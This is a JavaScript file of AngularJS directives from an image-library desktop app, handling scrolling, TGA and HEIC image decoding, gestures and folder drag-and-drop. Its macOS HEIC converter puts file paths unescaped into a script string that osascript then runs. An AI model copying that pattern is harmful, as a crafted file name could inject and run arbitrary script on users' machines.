                        resetNgGridLayoutData($bodyScope.allData, targetPage);
                    }
                }, 10);

                if (updatePosition) {
                    if (targetPage > 0) {
                        // setTimeout(function () { 
                            $boxContainer.scrollTop($boxContainer.scrollTop() + 100); 
                        // }, 200);
                    }
                }
                else {
                    if (targetPage > 0) {
                        // setTimeout(function () {
                        $bodyScope.showImages();
                        // }, 200);
                    }
                }
            }

            $scrollThumb.on("mousedown", function (event) {
                event.stopPropagation();
            });

            var dragTimeout;
            $scrollThumb.draggable({
                axis: "y",
                containment: "parent",
                scroll: false,
                start: function (event, ui) {
                    $scrollThumb.addClass("dragging");
                },
                drag: throttle(function (event, ui) {
                    event.stopPropagation();
                    // clearTimeout(dragTimeout);
                    var thumbnailHeight = $(event.target).height();
                    var scrollHeight = element.height() - thumbnailHeight;
                    var top = ui.position.top + thumbnailHeight / 2;
                    var percentage = Math.abs(top / scrollHeight * 100);
                    if (percentage > 100) percentage = 100;
                    var pageLength = parseInt($bodyScope.allData.length / $bodyScope.options.page);
                    var targetPage = parseInt(percentage / 100 * pageLength);
                    // dragTimeout = setTimeout(function () {
                        delete HoverPreview.lastElem;
                        goToPage(targetPage, { updatePosition: false });
                        if (targetPage === 0) {
                            if (!$("#sub-folder-container").is(":visible")) {
                                $("#sub-folder-container").show();
                            }
                        }
                        else {
                            if ($("#sub-folder-container").is(":visible")) {
                                $("#sub-folder-container").hide();
                            }
                        }
                    // }, 10);

                    if ($bodyScope.viewMode === "random") return;
                    var item = $bodyScope.allData[$bodyScope.options.page * targetPage];
                    if (!item) return;
                    switch (orderBy) {
                        case "IMPORT":
                        case "MANUAL":
                            $scrollHints.text($filter('date')(item.modificationTime, i18n.__('general.timeFormat')));
                            $scrollHints.css("display", "flex");
                            break;
                        case "NAME":
                            $scrollHints.text(item.name.trim()[0] && item.name.trim()[0].toUpperCase());
                            $scrollHints.css("display", "flex");
                            break;
                        case "FILESIZE":
                            $scrollHints.text(fileSize(item.size));
                            $scrollHints.css("display", "flex");
                            break;
                    }
                }, 15, true),
                stop: function (event, ui) {
                    $scrollThumb.removeClass("dragging");
                    setTimeout(function () {
                        $scrollHints.hide();
                        var its = ig.getItems();
                        var current;
                        if (its[0]) {
                            current = its[0].groupKey - 1000000;
                        }
                        if (current && current > 0) {
                            $boxContainer.scrollTop($boxContainer.scrollTop() + 20);
                        }
                        else {
                            $bodyScope.showImages();
                        }
                    }, 30);
                }
            });

            element.on("mousedown", function (event) {
                var scrollHeight = element.height();
                var mouseY = event.offsetY;
                var pageLength = parseInt($bodyScope.allData.length / $bodyScope.options.page);
                var percentage = mouseY / scrollHeight;
                var targetPage = Math.round(percentage * pageLength);

                goToPage(targetPage, { updatePosition: true });
            });
        }
    }
});

EagleApp.directive('tgaImg', function ($rootScope) {
    return {
        restrict: 'A',
        scope: {
            tgaImg: "=tgaImg"
        },
        link: function (scope, element, attrs, ngModel) {

            function tagCanNotRead (imageData) {
                if (!imageData) {
                    return false;
                }
                else {
                    var isSame = imageData.every( (val, i, arr) => val === arr[0] );
                    return isSame;
                }
            };

            var $parent = $(element[0].parentNode);

            scope.$watch("tgaImg", loadTga);

            function loadTga(newValue, oldValue) {
                if (!newValue) return;
                if ($parent.find("canvas").length > 0) {
                    element.css("opacity", 0);
                    element.css("position", "absolute");
                    element.css("z-index", "9999");
                    $parent.find("canvas").remove();
                }
                console.time("tga");
                var filePath = scope.tgaImg;
                var filePath2 = FileUrlHelper.getRawPath($bodyScope.current);
                try {
                    var TgaLoader = require(appRoot.path + "/app/js/vendors/tga.js");
                    var tga = new TgaLoader();
                    var buffer = fs.readFileSync(filePath2);
                    tga.load(buffer);
                    var canvas = tga.getCanvas();
                    var base64 = canvas.toDataURL('image/png');
                    var buffer = decodeBase64Image(base64).data;
                    if (buffer.length <= 5000) {
                        throw new Error("");
                        return;
                    }
                    $parent.append(canvas);
                    element.css("opacity", 0);
                    element.css("position", "absolute");
                    element.css("z-index", "9999");
                    console.timeEnd("tga");
                } catch (err) {
                    // electronLog && electronLog.error(err.stack || err);
                    var libtga = require(appRoot.path + "/app/js/vendors/libtga.js");
                    libtga.loadFile(filePath, function (err, img) {
                        if (!err && img && !tagCanNotRead(img.imageData)) {
                            var canvas = document.createElement('canvas');
                            var context = canvas.getContext('2d');
                            var imageData = context.createImageData(img.width, img.height);
                            canvas.height = img.height;
                            canvas.width = img.width;
                            imageData.data.set(img.imageData);
                            context.putImageData(imageData, 0, 0);

                            $parent.append(canvas);
                            element.css("opacity", 0);
                            element.css("position", "absolute");
                            element.css("z-index", "9999");
                            console.timeEnd("tga");
                        }
                    });
                }
            }
        }
    }
});

EagleApp.directive('heicImg', function ($rootScope) {
    return {
        restrict: 'A',
        scope: {
            heicImg: "=heicImg"
        },
        link: function (scope, element, attrs, ngModel) {

            const heic2canvas = require(appRoot + '/my_modules/heic2canvas');
            var $parent = $(element[0].parentNode);

            scope.$watch("heicImg", loadHeic);

			async function generateWithNative (src, dest, id) {
				return new Promise(async (resolve, reject) => {
			
					if (fs.existsSync(dest)) {
						return resolve(true);
					}

					if (process.platform === 'win32') {

						console.time("heic-edgejs");
						let result = await ipcRenderer.invoke('EdgeJS.Heic2File', {
							dest: dest,
							src: src,
							id: id
						});
						console.timeEnd("heic-edgejs");
						if (!result) {
							$rootScope.$broadcast('SHOW_HEIC_NOTIFICATION');
							return resolve(false);
						}
						setTimeout(() => {
							fs.unlink(dest, () => {});
						}, 60000);
						return resolve(true);
					}
					else {
						let osascript = require(appRoot + '/my_modules/osascript');
						let script = `
							ObjC.import("Cocoa");
							
							let src = '${src}';
							let dest = '${dest}';
							
							let nsImage = $.NSImage.alloc.initWithContentsOfFile(src);
							let imgRep = nsImage.representations.objectAtIndex(0);
							let nsData = nsImage.TIFFRepresentation;
							let bitmap = $.NSBitmapImageRep.imageRepWithData(nsData);
							let jpgData = bitmap.representationUsingTypeProperties($.NSJPEGFileType, $());
							let result = jpgData.writeToFileAtomically($.NSString.alloc.initWithUTF8String(dest), true);
				
							bitmap.release
							jpgData.release
							nsImage.release
				
							ObjC.deepUnwrap(result);
				
						`;
						console.time('osascript-heic')
						osascript.eval(script, { type: 'JavaScript' }, function (err, result) {
							console.timeEnd('osascript-heic')
							if (err || !result) return resolve(false);
							setTimeout(() => {
								fs.unlink(dest, () => {});
							}, 60000);
							return resolve(true);
						});
					}
				});
			}

            async function loadHeic(newValue, oldValue) {

                if (!newValue) return;
                console.time("heic");

				if ($parent.find("canvas").length > 0) {
                    element.css("opacity", 0);
                    element.css("position", "absolute");
                    element.css("z-index", "9999");
                    $parent.find("canvas").remove();
                }

				var image = scope.heicImg;
				var filePath = FileUrlHelper.getRawPath(image);
				var dest = path.normalize(`${EAGLE_THUMBNAIL_TEMP_PATH}/${image.id}_${image.modificationTime}.jpg`);
				let result = await generateWithNative(filePath, dest, image.id);
				
				if (result) {
					if ($bodyScope.current.id !== image.id) return;
					let src = URL_MODULE.pathToFileURL(dest).href + `?v=${Date.now()}`;
					var img = new Image();
					img.onload = function () {
						$('#detail-image').attr('src', src);
					};
					img.src = src;
					console.timeEnd("heic");
					return;
				}

                heic2canvas(filePath, function (err, canvas) {
                    if (!err && canvas) {

                        if ($parent.find("canvas").length > 0) {
                            element.css("opacity", 0);
                            element.css("position", "absolute");
                            element.css("z-index", "9999");
                            $parent.find("canvas").remove();
                        }
                        
                        var canvas = canvas;
                        $parent.append(canvas);
                        element.css("opacity", 0);
                        element.css("position", "absolute");
                        element.css("z-index", "9999");
                        console.timeEnd("heic");
                    }
                });
            }
        }
    }
});

EagleApp.directive('typeChecking', function ($rootScope) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs, ngModel) {

            var lastCheck;

            scope.$watch("current", function (newValue) {
                if (!newValue) { return }
                $(".image-wrap canvas").remove();
                lastCheck = element;
                checkAPNG(lastCheck);
            });

            function checkAPNG() {

                if (element != lastCheck) return;

                if (scope.current && scope.current.ext === "png") {

                    APNG.parseURL(element[0].src).then((data) => {
                        $rootScope.supportRotate = false;
                        $rootScope.supportCrop = false;
                    }, (data) => {
                        $rootScope.supportRotate = true;
                        $rootScope.supportCrop = true;
                    });
                }
                else if (scope.current && scope.current.ext === "webp") {

                    isAnimatedWebP(element[0].src, function (isAnimated) {
                        $rootScope.supportRotate = !isAnimated;
                        $rootScope.supportCrop = !isAnimated;
                    });

                    function isAnimatedWebP(src, callback) {
                        var request = new XMLHttpRequest();
                        request.open('GET', src, true);
                        request.addEventListener('load', function () {
                            if (request.response.indexOf("ANMF") != -1) {
                                callback(true);
                            }
                            else {
                                callback(false);
                            }
                        });
                        request.send();
                    }
                }
                else if (scope.current && (scope.current.orientation && scope.current.orientation !== 1) ) {
                    $rootScope.supportRotate = true;
                    $rootScope.supportCrop = false;
                }
                else {
                    $rootScope.supportRotate = true;
                    $rootScope.supportCrop = true;
                }
            };
        }
    }
});

EagleApp.directive('colorPicker', function ($rootScope) {
    return {
        restrict: 'A',
        require: 'ngModel',
        link: function (scope, element, attrs, ngModel) {
            var model = ngModel;
            scope.$on('$destroy', function () {
                element.off();
            });
        }
    }
});

var getFileBlob = function (url, cb) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url);
    xhr.responseType = "blob";
    xhr.addEventListener('load', function () {
        cb(xhr.response);
    });
    xhr.send();
};

var blobToFile = function (blob, name) {
    blob.lastModifiedDate = new Date();
    blob.name = name;
    return blob;
};

var getFileObject = function (filePathOrUrl, cb) {
    getFileBlob(filePathOrUrl, function (blob) {
        cb(blobToFile(blob, 'test.jpg'));
    });
};

EagleApp.directive('resizable', function ($rootScope, $timeout) {
    return {
        scope: { onResize: '&' },
        restrict: 'A',
        link: function (scope, elem, attrs) {
            $(elem).resizable({
                maxWidth: 600,
                minWidth: 200,
                handles: attrs.resizable,
                resize: function (event, ui) {
                    scope.onResize && scope.onResize({ event: event, ui: ui });
                    scope.$evalAsync();
                }
            });
        }
    }
});

EagleApp.directive('tagGroupResizable', function ($rootScope, $timeout) {
    return {
        scope: { onResize: '&' },
        restrict: 'A',
        link: function (scope, elem, attrs) {
            $(elem).resizable({
                maxHeight: 1200,
                minHeight: 100,
                handles: attrs.resizable,
                resize: function (event, ui) {
                    scope.onResize && scope.onResize({ event: event, ui: ui });
                    scope.$evalAsync();
                }
            });
        }
    }
});



// EagleApp.directive('lazyImgContainer', function($rootScope, $timeout) {
//     return {
//         restrict: 'A',
//         link: function(scope, elem, attrs) {
//             var $conainter = $(elem);
// $conainter.on("scroll", throttle(function() {
//     showImages();
// }, 500, true));
// let currentWindow = currentWindow.removeAllListeners();
// var currentWindow = currentWindow.removeAllListeners();
// currentWindow.on("resize", throttle(function() {
//     showImages();
// }, 500, true));
// scope.$on("$$rebind::refresh", function() {
// $timeout(function() {
// showImages();
// scope.$evalAsync();
// }, 1000, false);
// });
// scope.$on("$$rebind::refreshImageSize", throttle(function() {
// $timeout(function() {
// showImages();
// scope.$evalAsync();
// }, 300, false);
// }, 500, true));
//             function showImages () {
//                 var offset = $(window).height();
//                 $(".box img").each(function () {
//                     var $img = $(this);
//                     if (!$img.attr("src")) {
//                         var src = $img.attr("lazy-src");
//                         if (isElementInViewport($img, offset)) {
//                             $img.attr("src", src);
//                             $img.on('load', function() {
//                                 $img.parent().parent().addClass("show");
//                             });
//                         }
//                     }
//                 });
//             };
//         }
//     }
// });

// EagleApp.directive('infiniteScroll', function($rootScope) {
//     return {
//         scope: {
//             infiniteScroll: "&infiniteScroll",
//             infiniteScrollDisabled: "=infiniteScrollDisabled"
//         },
//         restrict: 'A',
//         link: function(scope, elem, attrs) {
//             var $conainter = $(attrs.infiniteScrollContainer);
//             $conainter.on("scroll", throttle(function() {
//                 if (isElementInViewport(elem, 2000)) {
//                     if (!scope.infiniteScrollDisabled) {
//                         if (scope.$$phase || $rootScope.$$phase) {
//                             // return scope.infiniteScroll();
//                         } else {
//                             // return scope.$evalAsync(scope.infiniteScroll);
//                         }
//                     }
//                 }
//             }, 500));
//         }
//     }
// });

// function isElementInViewport(el, offset) {
//     if (!offset) offset = 0;
//     if (!el) return false;
//     if (typeof jQuery === "function" && el instanceof jQuery) {
//         el = el[0];
//     }
//     var rect = el.getBoundingClientRect();
//     return (
//         rect.top >= 0 &&
//         rect.left >= 0 &&
//         rect.bottom <= (window.innerHeight + offset || document.documentElement.clientHeight) && /*or $(window).height() */
//         rect.right <= (window.innerWidth || document.documentElement.clientWidth) /*or $(window).width() */
//     );
// }

EagleApp.directive('ngRightClick', function ($parse) {
    return function (scope, element, attrs) {
        var fn = $parse(attrs.ngRightClick);
        scope.$on('$destroy', function () {
            element.off();
        });
        element.bind('contextmenu', function (event) {
            scope.$apply(function () {
                event && event.preventDefault();
                fn(scope, { $event: event });
            });
        });
    };
});

EagleApp.directive('repeatDone', function () {
    return function (scope, element, attrs) {
        if (scope.$last) { // all are rendered
            scope.$eval(attrs.repeatDone);
        }
    }
})

EagleApp.directive('noSpecialChar', function () {
    return {
        require: 'ngModel',
        restrict: 'A',
        link: function (scope, element, attrs, modelCtrl) {

            scope.$on('$destroy', function () {
                element.off();
            });

            element.on("keydown", function (event) {
                var regex = "^:";
                var key = event.key;
                if (regex.indexOf(key) !== -1) {
                    event.preventDefault();
                    return false;
                }
            })

            modelCtrl.$parsers.push(function (inputValue) {
                if (inputValue == null)
                    return ''
                cleanInputValue = inputValue.replace(/[:^//]+/g, '');
                if (cleanInputValue != inputValue) {
                    modelCtrl.$setViewValue(cleanInputValue);
                    modelCtrl.$render();
                }
                return cleanInputValue;
            });
        }
    }
});

EagleApp.directive('selectAll', function() {
    return function(scope, element, attrs) {
        var mousetrap = new Mousetrap(element[0]);
        mousetrap.bind('mod+a', function(event) {
            event && event.stopPropagation();
            element.select();
        });
        mousetrap.bind('esc', function(event) {
            event && event.stopPropagation();
            element.blur();
        });
    }
});

EagleApp.directive('editableSelectall', function () {
    return function (scope, element, attrs) {
        var mousetrap = new Mousetrap(element[0]);
        mousetrap.bind('mod+a', function (event) {
            event && event.stopPropagation();
            window.setTimeout(function () {
                var sel, range;
                if (window.getSelection && document.createRange) {
                    range = document.createRange();
                    range.selectNodeContents(element[0]);
                    sel = window.getSelection();
                    sel.removeAllRanges();
                    sel.addRange(range);
                } else if (document.body.createTextRange) {
                    range = document.body.createTextRange();
                    range.moveToElementText(element[0]);
                    range.select();
                }
            }, 1);
        });
        mousetrap.bind('esc', function (event) {
            event && event.stopPropagation();
            element.blur();
        });
    }
});

EagleApp.directive('scrollToActive', function ($timeout) {
    return {
        scope: {
            index: "=index",
            enable: "=enable"
        },
        link: function ($scope, elem, attrs, controller) {
            var $container = $(elem);
            if (attrs.scrollContainer) {
                $container = $(attrs.scrollContainer);
            }
            $scope.$watch("index", function (event, index) {
                if ($scope.enable !== undefined && !$scope.enable) return;
                if (!$container.is(":visible")) return;
                $timeout(function () {
                    if (index === undefined) return;
                    var $active = $container.find(".active-item");
                    if (!isElementInContainer($container, $active)) {
                        var pos = $active.offset();
                        if (pos && pos.top > $container.innerHeight() / 2) {
                            $container.stop().scrollTo($active, 0, { axis: 'y', offset: -$container.innerHeight() + $active.height(), queue: false });
                        } else {
                            $container.stop().scrollTo($active, 0, { axis: 'y', offset: 0, queue: false });
                        }
                    }
                }, 5);
            });
        }
    };
});

EagleApp.directive('sidebarScrollToActive', function ($timeout) {
    return {
        scope: {
            index: "=index"
        },
        link: function ($scope, elem, attrs, controller) {
            var $container = $(".sidebar-item-container");
            $scope.$watch("index", function (event, index) {
                $timeout(function () {
                    if (index === undefined) return;
                    var $active = $container.find(".active-item");
                    if (!isElementInContainer($container, $active)) {
                        var pos = $active.offset();
                        if (pos && pos.top > $container.innerHeight() / 2) {
                            $container.stop().scrollTo($active, 0, { axis: 'y', offset: -$container.innerHeight() + $active.height(), queue: false });
                        } else {
                            $container.stop().scrollTo($active, 0, { axis: 'y', offset: 0, queue: false });
                        }
                    }
                }, 1);
            });
        }
    };
});

EagleApp.directive('autoScroll', function () {
    return {
        link: function ($scope, elem, attrs, controller) {

            var $container = $(elem);
            $scope.$on("AutoScroll", function (event, index) {

                // 暫時做修正，未來有直接滾動 index 的方式再調整
                if (!$bodyScope.selected || $bodyScope.selected.length === 0) return;
                var boxId = $bodyScope.selected[$bodyScope.selected.length - 1].id;
                var height = $bodyScope.boxContianerHeight || $container.height(),
                // var height = ig._renderer._size.view,
                    box = $(`#box-${boxId}`);

                if (!box || box.length === 0) {
                    console.log("项目不再当前画面中，自动重新定位")
                    if ($scope.viewMode !== 'random' && $scope.viewMode !== 'duplicate') {
                        $bodyScope.scrollToSelectedItem();
                    }
                    return;
                }

                var boxHeight = box.height(),
                    scrollTop = box.offset().top,
                    offset = height / 2 - boxHeight;

                if (scrollTop - boxHeight / 2 < 0 || scrollTop + boxHeight / 2 > height || !isElementInViewport(box)) {
                    $container.stop().scrollTo(box, 100, { axis: 'y', offset: -boxHeight, queue: false });
                }

                setTimeout(function () {
                    if ($container[0].scrollTop === 0 && $bodyScope.startCursor !== 0) {
                        $container[0].scrollTop = 3;
                    }
                }, 200);
            });
        }
    };
});

EagleApp.directive('ngLongClick', function ($parse) {
    return {
        link: function ($scope, elem, $attrs, controller) {
            var callbackFn = $parse($attrs.ngLongClick);
            $(elem).longclick(400, function ($event) {
                $scope.$apply(function() {
                    callbackFn($scope, { $event: $event });
                });
            });
        }
    };
});

EagleApp.directive('ngHoverIntent', function ($parse) {
    return {
        link: function ($scope, elem, $attrs, controller) {
            var callbackFn = $parse($attrs.ngHoverIntent);
            $(elem).hoverIntent(function ($event) {
                $scope.$apply(function() {
                    callbackFn($scope, { $event: $event });
                });
            });
        }
    };
});

EagleApp.directive('imageonload', function() {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            element.on('load', function() {
                scope.$apply(attrs.imageonload)(true, scope.image, element[0]);
            });
            element.on('error', function(){
              scope.$apply(attrs.imageonload)(false, scope.image, element[0]);
            });
            scope.$on('$destroy', function() {
                element.off("load");
                element.off("err");
            });
        }
    };
})

EagleApp.directive('commentVideo', function() {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            var video = element[0];
            var $comment = element.parent();
            var comment = scope.comment;
            var duration = comment.duration;
            var isLoad = false;
			
			scope.$watch('comment', () => {
				isLoad = false;
			});

            $comment.on("hover.comment", function () {
                if (!isLoad) {
                    isLoad = true;
                    video.src = $bodyScope.getRawUrl($bodyScope.selected[0]);
                    $(video).on('loadedmetadata', function () {
                        if (duration) {
                            video.currentTime = duration;
                        }
                    });        
                }
            });

            scope.$on('$destroy', function () {
                $comment.off("hover.comment");
                $(video).off('loadedmetadata');
            });
        }
    };
});
EagleApp.directive('extIcon', function() {
    return {
        restrict: 'E',
        link: function(scope, element, attrs) {
        	function init () { 
	            let itemId = attrs.itemId;
	            let item = $bodyScope.itemMappings[itemId];
	            let rawPath = FileUrlHelper.getRawPath(item);
	            let html = `<div class="ext-icon"><img></div>`;
	            element.html(html);
	            FILE_ICON.getFileThumbnail(item, rawPath, function (base64) {
	                element.find("img").attr('src', base64);
	            });
            }
            attrs.$observe('itemId', function (val) {
                init();
            });
        }
    };
});
EagleApp.directive('mouseGesture', function () {
    return {
        restrict: 'A',
        link: function (scope, element, attrs) {

            var $scope = angular.element("body").scope();
            var downTime;
            var isZooming = false;
            var startPoint = { x: 0, y: 0 };
            var endPoint = { x: 0, y: 0 };
            var maxDistanceX = 0;
            var originData = { x: undefined, y: undefined, ratio: 100 };
            var $container = element;
            if (attrs.mouseGesture) {
                $container = $(attrs.mouseGesture);
            }

            scope.$on('$destroy', function () {
                $container.off('mousedown.mouseGesture');             
                $(window).off('mousemove.mouseGesture');
                $(window).on('mouseup.mouseGesture');
            });

            $container.on('mousedown.mouseGesture', (event) =>{
                document.activeElement.blur();
                if (event.button === 2 || event.button === 1) {
                    event.preventDefault();
                    event.stopPropagation();
                    downTime = Date.now();
                    [startPoint.x, startPoint.y] = [event.pageX, event.pageY];
                    originData.ratio = $scope.imageSize.zoomRatio;
                    originData.x = event.pageX;
                    originData.y = event.pageY;
                    maxDistanceX = 0;
                }
            });

            $(window).on('mousemove.mouseGesture', (event) =>{
                if (startPoint.y) {
                    if (isZooming || Math.abs(startPoint.y - event.pageY) > Math.abs(startPoint.x - event.pageX)) {
                        isZooming = true;
                        var distanceY = (startPoint.y - event.pageY);
            
                        // 动态调整因子，根据当前缩放比例来调整灵敏度
                        var sensitivityFactor = originData.ratio < 100 ? 100 : 150;
            
                        var scale = Math.exp(distanceY / sensitivityFactor); // 使用调整后的灵敏度因子
                        var ratio = originData.ratio * scale;
            
                        // 确保缩放比例在5%到800%之间
                        ratio = Math.max(5, Math.min(200, ratio));
            
                        $scope.updateZoomRatio(ratio, originData.x, originData.y);
                        $scope.$evalAsync();
                    }
                }
                if (Math.abs(startPoint.x - event.pageX) > maxDistanceX) {
                    maxDistanceX = Math.abs(startPoint.x - event.pageX);
                }
            });

            $(window).on('mouseup.mouseGesture', (event) =>{
                if (event.button === 2 || event.button === 1) {
                    event.preventDefault();
                    event.stopPropagation();
                    [endPoint.x, endPoint.y] = [event.pageX, event.pageY];
                    if (Math.abs(startPoint.y - event.pageY) - 5 > Math.abs(startPoint.x - event.pageX)) {
                    }
                    // 左右
                    else if (Math.abs(endPoint.x - startPoint.x) > 20 && originData.ratio === $scope.imageSize.zoomRatio){
                        // 必须在 0.3 秒内拖拽才进行换页功能
                        // console.log(maxDistanceX);
                        // console.log( Math.abs(endPoint.x - startPoint.x))
                        if (Date.now() - downTime <= 1000 && Math.abs(endPoint.x - startPoint.x) > maxDistanceX * 2 / 3) {
                            // 右
                            if (endPoint.x > startPoint.x) {
                                $scope.selectNext();
                                $scope.$evalAsync();
                            }
                            else {
                                $scope.selectPrev();
                                $scope.$evalAsync();
                            }
                        }
                    }
                    else if (!isZooming && Math.abs(endPoint.x - startPoint.x) < 2 && Math.abs(endPoint.y - startPoint.y) < 2) {
                        if (event && event.button === 1) {
                            $scope.openPluginPanel();
                        }
                        else {
                            $scope.openItemContextMenu(event, $scope.current);
                            $scope.$evalAsync();
                        }
                    }
                }
                downTime = undefined;
                isZooming = false;
                startPoint = { x: 0, y: 0 };
                endPoint = { x: 0, y: 0 };
                originData = { x: undefined, y: undefined, ratio: 100 };
            });
        }
    }
});
EagleApp.directive('folderDraggable', function($rootScope) {
    return {
        // A = attribute, E = Element, C = Class and M = HTML Comment
        restrict: 'A',
        //The link function is responsible for registering DOM listeners as well as updating the DOM.
        link: function(scope, element, attrs) {
            var $scope = angular.element("body").scope();
            element.draggable({
                scroll: true,
                scrollSensitivity: 10,
                containment: ".folder-list",
                helper: "clone",
                cursorAt: { top: 5, left: 5 },
                distance: 5,
                // axis: "y",
                revert: false,
                drag: function () {},
                start: function () {
                    $rootScope.currentFocus = '';
                    $scope.$evalAsync();
                },
                stop: function () {
                    $rootScope.currentFocus = 'sidebar';
                    $scope.$evalAsync();
                }
            });
        }
    };
});

EagleApp.directive('folderDroppable', function($compile) {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            element.droppable({
                accept: ".folder",
                tolerance: 'pointer',
                hoverClass: "drop",
                over: function( event, ui ) {
                    event.stopPropagation();
                    $(".group-item").removeClass("drop");
                    $(this).parent().parent().addClass("drop");
                },
                out: function( event, ui ) {
                    event.stopPropagation();
                    $(this).parent().parent().removeClass("drop");
                },
                drop: function(event, ui) {
                    event.stopPropagation();
                    var $scope = angular.element("body").scope();
                    var draggedFolder = angular.element(ui.draggable).scope().child || angular.element(ui.draggable).scope().folder;
                    var droppedFolder = angular.element(this).scope().$parent.folder;
                    
                    // 如果拖曳的資料夾在第一層
                    var idx = $scope.folders.indexOf(draggedFolder);
                    // 僅能拖曳第一層的資料夾到資料夾上，沒有孩子的才能拉
                    if (idx !== -1 && (!draggedFolder.children || draggedFolder.children.length === 0)) {
                        if (!droppedFolder.children) droppedFolder.children = [];
                        $scope.folders.splice(idx, 1);
                        draggedFolder.parent = droppedFolder.id;
                        droppedFolder.children.push(draggedFolder);
                        droppedFolder.isExpand = true;
                        $scope.saveFolder();
                        $scope.calculateImageBinding();
                    }
                    // 第二層內容拖曳至其他第一層
                    else {
                        var cfolder = angular.element(ui.draggable).scope().folder;
                        if (!cfolder.children) return;
                        var cidx = cfolder.children.indexOf(draggedFolder);
                        if (cidx !== -1) {
                            cfolder.children.splice(cidx, 1);
                            if (!droppedFolder.children) droppedFolder.children = [];
                            draggedFolder.parent = droppedFolder.id;
                            droppedFolder.children.push(draggedFolder);
                            droppedFolder.isExpand = true;
                            $scope.saveFolder();
                            $scope.calculateImageBinding();
                        }
                    }
                }
            });
        }
    };
});

EagleApp.directive('sortTopDroppable', function($compile) {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            element.droppable({
                accept: ".folder",
                tolerance: 'pointer',
                hoverClass: "drop",
                greddy: attrs.greddy == "true",
                over: function( event, ui ) {
                    event.stopPropagation();
                },
                drop: function(event, ui) {
                    event.stopPropagation();
                    var $scope = angular.element("body").scope();
                    var draggedScope = angular.element(ui.draggable).scope();
                    var droppedScope = angular.element(this).scope();
                    if (!draggedScope || !droppedScope) return;

                    var draggedFolder = draggedScope && draggedScope.child || draggedScope.folder;
                    var droppedFolder = droppedScope && droppedScope.child || droppedScope.folder;
                    var idx = $scope.folders.indexOf(droppedFolder);
                    if (draggedFolder == droppedScope.folder) return;
                    // 放開的資料夾是否為第一層
                    if (idx !== -1) {
                        var dragIdx = $scope.folders.indexOf(draggedFolder);
                        // 第一層拉到第一層
                        if (dragIdx !== -1) {
                            $scope.folders.splice(dragIdx, 1);
                            if (dragIdx > idx) {
                                $scope.folders.splice(idx, 0, draggedFolder);
                            }
                            else {
                                $scope.folders.splice(idx - 1, 0, draggedFolder);
                            }
                        }
                        // 第二層拉到第一層
                        else {
                            var children = draggedScope.folder.children;
                            var cidx = children.indexOf(draggedFolder);
                            var parentIdx = $scope.folders.indexOf(draggedScope.folder);
                            children.splice(cidx, 1);
                            delete draggedFolder.parent;
                            $scope.folders.splice(idx, 0, draggedFolder);
                        }
                    }
                    // 拖曳至第二層
                    else {
                        var dragIdx = $scope.folders.indexOf(draggedFolder);
                        // 第一層拉到第二層
                        if (dragIdx !== -1) {
                            if (draggedFolder.children && draggedFolder.children.length > 0) return;
                            $scope.folders.splice(dragIdx, 1);
                            var children = droppedScope.folder.children;
                            var cidx = children.indexOf(droppedFolder);
                            draggedFolder.parent = droppedScope.folder.id;
                            children.splice(cidx, 0, draggedFolder);
                            $scope.calculateImageBinding();
                        }
                        // 第二層拉到第二層
                        else {
                            var dragChildren = draggedScope.folder.children;
                            var dragcidx = dragChildren.indexOf(draggedFolder);
                            var droppedChildren = droppedScope.folder.children;

                            dragChildren.splice(dragcidx, 1);

                            var dropcidx = droppedChildren.indexOf(droppedFolder);
                            draggedFolder.parent = draggedScope.folder.id;
                            droppedChildren.splice(dropcidx, 0, draggedFolder);
                            // 如果父親不同，才需要更新畫面
                            if (dragChildren != droppedChildren) {
                                $scope.calculateImageBinding();
                            }
                        }
                    }
                   
                    $(event.target).removeClass("drop");
                    draggingItem = undefined;
                    $scope.saveFolder();
                    $scope.$evalAsync();
                }
            });
        }
    };
});

EagleApp.directive('sortBottomDroppable', function($compile) {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            element.droppable({
                accept: ".folder",
                tolerance: 'pointer',
                hoverClass: "drop",
                greddy: attrs.greddy == "true",
                over: function( event, ui ) {
                    event.stopPropagation();
                },
                drop: function(event, ui) {
                    event.stopPropagation();
                    var $scope = angular.element("body").scope();
                    var draggedScope = angular.element(ui.draggable).scope();
                    var droppedScope = angular.element(this).scope();
                    if (!draggedScope || !droppedScope) return;

                    var draggedFolder = draggedScope && draggedScope.child || draggedScope.folder;
                    var droppedFolder = droppedScope && droppedScope.child || droppedScope.folder;
                    var idx = $scope.folders.indexOf(droppedFolder);
                    if (draggedFolder == droppedScope.folder) return;
                    // 放開的資料夾是否為第一層
                    if (idx !== -1) {
                        var dragIdx = $scope.folders.indexOf(draggedFolder);
                        // 第一層拉到第一層
                        if (dragIdx !== -1) {
                            $scope.folders.splice(dragIdx, 1);
                            if (dragIdx > idx) {
                                $scope.folders.splice(idx +1, 0, draggedFolder);
                            }
                            else {
                                $scope.folders.splice(idx, 0, draggedFolder);
                            }
                        }
                        // 第二層拉到第一層
                        else {
                            var children = draggedScope.folder.children;
                            var cidx = children.indexOf(draggedFolder);
                            var parentIdx = $scope.folders.indexOf(draggedScope.folder);
                            children.splice(cidx, 1);
                            $scope.folders.splice(idx + 1, 0, draggedFolder);
                        }
                    }
                    // 拖曳至第二層
                    else {
                        var dragIdx = $scope.folders.indexOf(draggedFolder);
                        // 第一層拉到第二層
                        if (dragIdx !== -1) {
                            if (draggedFolder.children && draggedFolder.children.length > 0) return;
                            $scope.folders.splice(dragIdx, 1);
                            var children = droppedScope.folder.children;
                            var cidx = children.indexOf(droppedFolder);
                            draggedFolder.parent = droppedScope.folder.id;
                            children.splice(cidx + 1, 0, draggedFolder);
                            $scope.calculateImageBinding();
                        }
                        // 第二層拉到第二層
                        else {
                            var dragChildren = draggedScope.folder.children;
                            var dragcidx = dragChildren.indexOf(draggedFolder);
                            var droppedChildren = droppedScope.folder.children;
                            
                            dragChildren.splice(dragcidx, 1);

                            var dropcidx = droppedChildren.indexOf(droppedFolder);
                            draggedFolder.parent = draggedScope.folder.id;
                            droppedChildren.splice(dropcidx, 0, draggedFolder);
                            if (dragChildren != droppedChildren) {
                                $scope.calculateImageBinding();
                            }
                        }
                    }
                   
                    $(event.target).removeClass("drop");
                    draggingItem = undefined;
                    $scope.saveFolder();
                    $scope.$evalAsync();
                }
            });
        }
    };
});
